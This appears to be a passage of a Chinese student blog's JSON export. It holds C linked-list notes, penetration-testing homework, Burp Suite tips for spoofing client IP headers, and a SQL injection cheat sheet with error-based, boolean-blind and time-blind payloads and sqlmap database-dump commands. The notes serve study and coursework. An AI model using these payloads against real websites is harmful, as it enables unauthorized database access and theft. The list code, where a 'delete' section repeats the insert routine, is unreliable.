Node* LinkList; //单链表类型定义 创建链表1234567LinkList SetNullList_Link() &#123; LinkList head = (LinkList)malloc(sizeof(struct Node)); if (head != NULL) head-&gt;next = NULL; else printf(&quot;alloc failure&quot;); return head; &#125; 头插法12345678910111213141516void CreateList_Head(struct Node* head) //用头插法创建单链表 &#123; PNode p=NULL; //临时使用 int data; printf(&quot; 头插法，请输入整形数据建立链表，以 -1 结束\\n&quot;); scanf(&quot;%d&quot;,&amp;data); while(data!=-1) &#123; p=(struct Node*)malloc(sizeof(struct Node)); //分配空间 p -&gt; data=data; //对数据域赋值 p -&gt;next = head -&gt;next; //对next域赋值 head -&gt; next =p; scanf(&quot;%d&quot;,&amp;data); &#125;&#125; 尾插法123456789101112131415161718void CreateList_Tail(struct Node* head) //用尾插法建立链表 &#123; struct Node* p=NULL; struct Node* q=head; int data; printf(&quot;尾插法， 请输入整形数据建立链表，以 -1 结束\\n&quot;); scanf(&quot;%d&quot;,&amp;data); while(data!=-1) &#123; p=(struct Node*)malloc(sizeof(struct Node)); //分配空间 p -&gt; data=data; //数据域赋值 p -&gt;next =NULL; //指针域赋值 q -&gt;next =p; q=p; scanf(&quot;%d&quot;,&amp;data); &#125;&#125; 输出链表123456789void print(LinkList head)&#123; PNode p=head -&gt; next; while(p) &#123; printf(&quot;%d\\n&quot;,p -&gt; data); p=p-&gt;next; &#125; 插入算法1234567891011121314151617181920212223//其中 llist是操作的链表，x是待插入元素y的前驱节点元素，y是待插入的元素int InsertPost_link(LinkList llist,DataType x,DataType y)&#123; PNode p =llist; PNode Newp=(PNode)malloc(sizeof(struct Node)); Newp -&gt; data=y; Newp -&gt; next =NULL; while(p!=NULL)&#123; if (p -&gt; data==x) &#123; Newp -&gt; next=p -&gt; next; p -&gt;next =Newp; return 1; &#125; else&#123; p=p -&gt;next; &#125; &#125; printf(&quot;not exist data %d\\n&quot;,x); return 1;&#125; 删除算法12345678910111213141516171819void DelNode_Link(LinkList head,int deldata)&#123; if(head==NULL)return 1; PNode prees=head; PNode current=head -&gt; next; while(current)&#123; if(current -&gt; data == deldata) &#123; prees -&gt; next = current -&gt; next; free(current); return 1; &#125; else &#123; prees=current; current=current -&gt;next; &#125; &#125; printf(&quot;not exist %d\\n&quot;,deldata);&#125; 循环链表123456789101112131415161718//将尾结点连接到头结点PNode buildCircularLinkedList(int n, PNode tail)&#123; PNode current=NULL, prev; prev = tail; for (int i = 0; i &lt; n; i++) &#123; current = (PNode)malloc(sizeof(Node)); current-&gt;next = NULL; scanf(&quot;%d&quot;, &amp;current-&gt;data); prev-&gt;next = current; prev = current; &#125; current-&gt;next = tail-&gt;next; tail-&gt;next = current; return tail;&#125; 双链表类型定义1234567struct Node&#123; int data; struct Node* pre; struct Node* next;&#125;;typedef struct Node* LinkList;typedef struct Node* PNode; 创建链表12345678LinkList SetList_Link()&#123; LinkList head=(LinkList)malloc(sizeof(struct Node)); head-&gt;data=0; head-&gt;pre=NULL; head-&gt;next=NULL; return head;&#125; 头插法123456789101112void HeadInsert(LinkList head,int data)&#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;pre = head; newNode-&gt;next = head-&gt;next; if(head-&gt;next != NULL) &#123; head-&gt;next-&gt;pre = newNode; &#125; head-&gt;next = newNode; &#125; 尾插法12345678910111213void TailInsert(LinkList head, int data)&#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;next = NULL; PNode p = head; while (p-&gt;next != NULL) &#123; p = p-&gt;next; &#125; newNode-&gt;pre = p; p-&gt;next = newNode;&#125; 输出链表12345678910void PrintList(LinkList head)&#123; LinkList PrintList=head-&gt;next; while(PrintList) &#123; printf(&quot;%d-&gt;&quot;,PrintList-&gt;data); PrintList=PrintList-&gt;next; &#125; printf(&quot;NULL\\n&quot;);&#125; 删除12345678910111213void TailInsert(LinkList head, int data)&#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;next = NULL; PNode p = head; while (p-&gt;next != NULL) &#123; p = p-&gt;next; &#125; newNode-&gt;pre = p; p-&gt;next = newNode;&#125; 插入算法1234567891011121314151617181920212223void InsertAfterElement(LinkList head, int target, int data)&#123; PNode p = head-&gt;next; while (p != NULL) &#123; if (p-&gt;data == target) &#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;next = p-&gt;next; if (p-&gt;next != NULL) &#123; p-&gt;next-&gt;pre = newNode; &#125; newNode-&gt;pre = p; p-&gt;next = newNode; head-&gt;data++; return; &#125; p = p-&gt;next; &#125; printf(&quot;Target element not found\\n&quot;);&#125;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"数据结构","slug":"开发/数据结构","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"作业No2","slug":"作业2","date":"2023-12-06T03:17:46.631Z","updated":"2023-12-08T07:03:03.745Z","comments":true,"path":"2023/12/06/作业2/","permalink":"http://example.com/2023/12/06/%E4%BD%9C%E4%B8%9A2/","excerpt":"","text":"题目汇总1.与ZoomEye功能类似的搜索引擎还有哪些？ 2.利用ZoomEye进行相关搜索，截图，发布到自己的Blog。 3.子域名收集，截图。 题目1与ZoomEye功能类似的搜索引擎还有哪些？ 回答： 除了ZoomEye之外，还有一些功能类似的搜索引擎，包括： Shodan：Shodan是一个面向物联网设备的搜索引擎，可以搜索全球范围内连接到互联网的设备，包括路由器、摄像头、服务器等等。用户可以使用Shodan搜索设备，发现漏洞，探查设备安全性等。 BinaryEdge：BinaryEdge是一款面向企业的安全分析工具，提供网络情报、风险评估、漏洞扫描等功能。与ZoomEye类似，BinaryEdge可以搜索Internet上所有的设备和服务，并对其进行评估和分类。 Censys：Censys是一个面向互联网设备和服务的搜索引擎，可以帮助用户发现全球范围内的漏洞和威胁。它可以搜索IPv4和IPv6地址、证书、域名、协议等信息。 Fofa Pro：Fofa Pro是一款面向企业的网络安全搜索引擎，可以搜索包括IP地址、域名、子域名、端口、关键词等信息。它可以帮助用户发现互联网上的资产和漏洞，评估企业的安全风险。 题目2利用ZoomEye进行相关搜索，截图，发布到自己的Blog 回答：搜索 领势 Compact Wireless-G 网络视频摄像机 http服务器 题目3子域名收集，截图。 回答：搜索 百度 的子域名","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"作业","slug":"安全/网络渗透测试/作业","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"作业","slug":"作业","permalink":"http://example.com/tags/%E4%BD%9C%E4%B8%9A/"}]},{"title":"作业No1","slug":"作业1","date":"2023-12-05T05:32:57.310Z","updated":"2023-12-08T07:02:51.086Z","comments":true,"path":"2023/12/05/作业1/","permalink":"http://example.com/2023/12/05/%E4%BD%9C%E4%B8%9A1/","excerpt":"","text":"题目汇总1、Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？2、Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？3、对于1、2的结果，进行总结分析。注：网络配置发生变化，建议重启网卡（操作命令见PPT）作业发布到自己blog备查。 题目1Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？ 回答：不能 题目2Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？ 回答：能 题目3对于1、2的结果，进行总结分析。 回答：Guet-WiFi会给物理机分配ip，不会给虚拟机分配ip","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"作业","slug":"安全/网络渗透测试/作业","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"作业","slug":"作业","permalink":"http://example.com/tags/%E4%BD%9C%E4%B8%9A/"}]},{"title":"burpsuit使用","slug":"burpsuite使用","date":"2023-11-22T05:31:01.277Z","updated":"2023-12-08T11:28:40.816Z","comments":true,"path":"2023/11/22/burpsuite使用/","permalink":"http://example.com/2023/11/22/burpsuite%E4%BD%BF%E7%94%A8/","excerpt":"","text":"更改数据包get请求将请求改为如下 post请求使用POST提交方法和GET类似，将GET改为POST，在末尾添加b&#x3D;2，此时记得添加Content-Type: application&#x2F;x-www-form-urlencoded 伪造IP随便加一行： X-Forwarded-For:127.0.0.1X-Forwarded:127.0.0.1Forwarded-For:127.0.0.1Forwarded:127.0.0.1X-Forwarded-Host:127.0.0.1X-remote-IP:127.0.0.1X-remote-addr:127.0.0.1True-Client-IP:127.0.0.1X-Client-IP:127.0.0.1Client-IP:127.0.0.1X-Real-IP:127.0.0.1Ali-CDN-Real-IP:127.0.0.1Cdn-Src-Ip:127.0.0.1Cdn-Real-Ip:127.0.0.1CF-Connecting-IP:127.0.0.1X-Cluster-Client-IP:127.0.0.1WL-Proxy-Client-IP:127.0.0.1Proxy-Client-IP:127.0.0.1Fastly-Client-Ip:127.0.0.1True-Client-Ip:127.0.0.1 伪造浏览器和设备修改User-Agent 伪造网址修改referer 密码爆破","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"SQL注入","slug":"sql注入","date":"2023-11-20T05:58:04.625Z","updated":"2023-12-21T11:18:21.069Z","comments":true,"path":"2023/11/20/sql注入/","permalink":"http://example.com/2023/11/20/sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"MySQL操作登陆：1mysql -u [用户名] -p 查询用户名所有数据库：1show databases; 创建数据库：1create database [数据库名]； 删除数据库：1drop database [数据库名] ; 使用数据库：1use [数据库名]; 查询数据库中的表：show tables; 创建表：123456789create table [表名](id int;name varchar(40);) 更改数据表名：1rename table [原数据表名] to [新数据表名] 向数据表中插入数据：1insert into [数据表名] (id ,name,age) values (1,&quot;tom&quot; 19); 向数据表中擦插入新的列：1alter table [数据表名] [列名] [列的数据类型]； 更改数据表中的数据：123update [数据表名] set name=&quot;lisa&quot; where id=1;--修改id=1的行name为lisa 删除数据表中的列：1alter table [数据表名] drop [列名] 删除数据表中的行：123delete from [数据表名] where id=1;--删除id=1的行 查询数据表的包涵数据：123select *from [数据表名] where id in (‘3’)；--在数据表中查询id中包涵‘3’的数据 联合查询：123select country from [数据表名1] union select country from [数据表名2] order country;--查询数据表1和数据表2中不同的country 排序：123select * from users order by age asc;--asc升序，desc降序 注入：数字&#x2F;字符型注入：判断：1id=2-1 查询网站所用数据表列数：123select * from users where id=1 order by x;--x从1开始递增，当返回数据显示发生变化时，x-1为数据表列数 查询网站所用数据数据库123select * from users where id=&#x27;0&#x27; union select 1,2,database(),4;--select 后面的数量要与users列数相同 使用：1select group_concat(schema_name) from information_schema.schemata（查库） 1select group_concat(table_name) from information_schema.tables where table_schema=库名（查表) 1select group_concat(column_name) from information_schema.columns where table_schema=[数据库名] and table_name=[表名]（查列） 1select 列名 from 库名.表名（查数据) 报错注入extractvalue1234567查数据库名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))爆表名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))爆字段名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))爆数据：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME)))) ① 0x7e&#x3D;’’ ② concat(‘a’,‘b’)&#x3D;“ab” ③ version()&#x3D;@@version ④ ‘‘可以换成’#’、’$’等不满足xpath格式的字符 ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位 updatexml1234567爆数据库名：&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))爆表名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))爆列名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))爆数据：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e)) floor()：1234567爆数据库名：&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a爆表名：&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a爆列名：&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a爆数据：&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a 布尔盲注当存在SQL注入时，攻击者无法通过页面或请求的返回信息，回显或获取到SQL注入语句的执行结果，这种情况就叫盲注。布尔型盲注就是利用返回的True或False来判断注入语句是否执行成功。它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。 什么情况下考虑使用布尔盲注？ 1. 该输入框存在注入点。 2. 该页面或请求不会回显注入语句执行结果，故无法使用UNION注入。 3. 对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入。 常用函数 1.length（str）函数 返回字符串的长度 2.substr（str,poc,len）截取字符串,poc表示截取字符串的开始位，len表示截取字符串的长度 3.ascii（）返回字符的ascii码，返回该字符对应的ascii码 4.count（）：返回当前列的数量 5.case when (条件) then 代码1 else 代码2 end :条件成立，则执行代码1，否则执行代码2 函数替换 12345678910111.如果程序过滤了substr函数，可以用其他函数代替：效果与substr（）一样2.left（str，index）从左边第index开始截取3.right(str，index)从右边第index开始截取4.substring（str，index）从左边index开始截取5.mid（str，index，len）截取str从index开始，截取len的长度6.lpad（str，len，padstr）7.rpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果8.如果程序过滤了 = （等于号），可以用in()、like代替，效果一样：9.如果程序过滤了ascii（），可以用hex()、bin（）、ord()代替，效果一样： 布尔盲注一般流程 因为盲注不能直接用database（）函数得到数据库名，所以步骤如下： 12345①判断数据库名的长度：and length(database())&gt;11 回显正常；and length(database())&gt;12 回显错误，说明数据库名是等于12个字符。②猜测数据库名（使用ascii码来依次判断）：and (ascii(substr(database(),1,1)))&gt;100 --+ 通过不断测试，确定ascii值，查看asciii表可以得出该字符，通过改变database（）后面第一个数字，可以往后继续猜测第二个、第三个字母…③猜测表名：and (ascii(substr((select table_name from information_schema.tables where table.schema=database() limit 1,1)1,1)&gt;144 --+ 往后继续猜测第二个、第三个字母…④猜测字段名（列名）：and (ascii(substr((select column_name from information_schema.columns where table.schema=database() and table_name=’数据库表名’ limit 0,1)1,1)&gt;105 --+ 经过猜测 ascii为 105 为i 也就是表的第一个列名 id的第一个字母;同样,通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段.⑤猜测字段内容：因为知道了列名，所以直接 select password from users 就可以获取password里面的内容，username也一样 and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+ 时间盲注界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。时间盲注与布尔盲注类似。时间型盲注就是利用时间函数的延迟特性来判断注入语句是否执行成功。 什么情况下考虑使用时间盲注？ 无法确定参数的传入类型。整型，加单引号，加双引号返回结果都一样 不会回显注入语句执行结果，故无法使用UNION注入 不会显示报错信息，故无法使用报错注入 符合盲注的特征，但不属于布尔型盲注 常用函数 sleep(n)：将程序挂起一段时间 n为n秒。 if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。 使用sleep()函数和if()函数：`and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)) --+` 如果返回正确则 页面会停顿10秒，返回错误则会立马返回。只有指定条件的记录存在时才会停止指定的秒数。 时间盲注一般流程 123456789101112131415161718①猜测数据库名称长度：输入：id=1&#x27; and If(length(database()) &gt; 1,1,sleep(5))--+用时：&lt;1s，数据库名称长度&gt;1…输入：id=1&#x27; and If(length(database()) &gt;8 ,1,sleep(5))--+用时：5s，数据库名称长度=8得出结论：数据库名称长度等于8个字符。②猜测数据库名称的一个字符：输入：id=1&#x27; and If(ascii(substr(database(),1,1))=97,sleep(5),1)--+用时：&lt;1s…输入：id=1&#x27; and If(ascii(substr(database(),1,1))=115,sleep(5),1)--+用时：5s得出结论：数据库名称的第一个字符是小写字母s。改变substr的值，以此类推第n个字母。最后猜出数据库名称。③猜测数据库表名：先猜测长度，与上面内容相似。④猜测数据库字段：先猜测长度，与上面内容相似。⑤猜测字段内容：先猜测长度，与上面内容相似。 sqlmap使用：指定位置注入1、-p，指定具体探测的参数 123sqlmap -u url -p id --dbs --对id进行探测 123sqlmap -u url -p &quot;id,name&quot; --dbs --对id和name都进行探测 2、–skip，忽略探测的参数 123sqlmap -u url --level 5 --skip host --dbs --5级对所有存在的注入点进行探测，这里忽略了host get型1、查看所有「数据库」 1sqlmap -u &#x27;http://xx/?id=1&#x27; --dbs 2.查看「数据表」 1sqlmap -u &#x27;http://xx/?id=1&#x27; -D [数据库名] --tables 3.查看「数据」 1sqlmap -u &#x27;http://xx/?id=1&#x27; -D [数据库名] -T [数据库表名] --dump post型1.使用bp抓包并标注注入点（在后面加*） 复制数据包内容到kali并保存为文档 使用sqlmap注入 12sqlmap -r 1.txt --dbs 12sqlmap -r 1.txt -D pikachu --tables 余下步骤与get型一样","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]}],"categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"},{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"数据结构","slug":"开发/数据结构","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"作业","slug":"安全/网络渗透测试/作业","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E4%B8%9A/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"},{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"作业","slug":"作业","permalink":"http://example.com/tags/%E4%BD%9C%E4%B8%9A/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]}